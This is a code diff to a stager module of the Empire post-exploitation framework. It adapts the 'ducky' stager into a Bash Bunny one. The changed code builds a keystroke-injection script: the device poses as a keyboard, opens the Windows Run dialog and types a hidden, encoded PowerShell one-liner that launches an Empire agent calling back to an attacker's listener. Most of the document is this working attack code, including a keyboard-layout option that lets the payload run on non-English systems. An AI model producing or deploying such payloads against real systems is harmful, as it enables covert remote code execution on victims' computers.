@@ -5,14 +5,15 @@ class Stager:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'DuckyLauncher',
+            'Name': 'BunnyLauncher',
 
-            'Author': ['@harmj0y','@kisasondi'],
+            'Author': ['@kisasondi','@harmj0y'],
 
-            'Description': ('Generates a ducky script that runes a one-liner stage0 launcher for Empire.'),
+            'Description': ('Generates a bunny script that runes a one-liner stage0 launcher for Empire.'),
 
             'Comments': [
-                ''
+                'This stager is modification of the ducky stager by @harmj0y,',
+                'Current other language (keyboard layout) support is trough DuckyInstall from https://github.com/hak5/bashbunny-payloads'
             ]
         }
 
@@ -30,8 +31,13 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'powershell'
             },
+            'Keyboard' : {
+                'Description'   :   'Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, try DE, HR...',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
             'Interpreter' : {
-                'Description'   :   'Which interpreter do you want? (powershell or cmd)',
+                'Description'   :   'Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe)',
                 'Required'      :   False,
                 'Value'         :   'powershell'
             },
@@ -78,6 +84,7 @@ class Stager:
         # extract all of our options
         language = self.options['Language']['Value']
         interpreter = self.options['Interpreter']['Value']
+        keyboard = self.options['Keyboard']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -86,20 +93,25 @@ class Stager:
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        
 
-        if launcher == "" or interpreter == "":
+        if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
         else:
             enc = launcher.split(" ")[-1]
-
-            duckyCode =  "DELAY 3000\n"
-            duckyCode += "GUI r\n"
-            duckyCode += "DELAY 1000\n"
-            duckyCode += "STRING "+ interpreter + "\n"
-            duckyCode += "ENTER\n"
-            duckyCode += "DELAY 2000\n"
-            duckyCode += "STRING powershell -W Hidden -nop -noni -enc "+enc+" \n"
-            duckyCode += "ENTER\n"
-
-            return duckyCode
+            bunnyCode =  "#!/bin/bash\n"
+            bunnyCode += "LED R G\n"
+            bunnyCode += "source bunny_helpers.sh\n"
+            bunnyCode += "ATTACKMODE HID\n"
+            if keyboard != '': 
+                bunnyCode += "Q SET_LANGUAGE " + keyboard + "\n"
+            bunnyCode += "Q DELAY 500\n"
+            bunnyCode += "Q GUI r\n"
+            bunnyCode += "Q STRING " + interpreter + "\n"
+            bunnyCode += "Q ENTER\n"
+            bunnyCode += "Q DELAY 500\n"
+            bunnyCode += "Q STRING powershell -W Hidden -nop -noni -enc "+enc+"\n"
+            bunnyCode += "Q ENTER\n"
+            bunnyCode += "LED R G B 200\n"
+            return bunnyCode
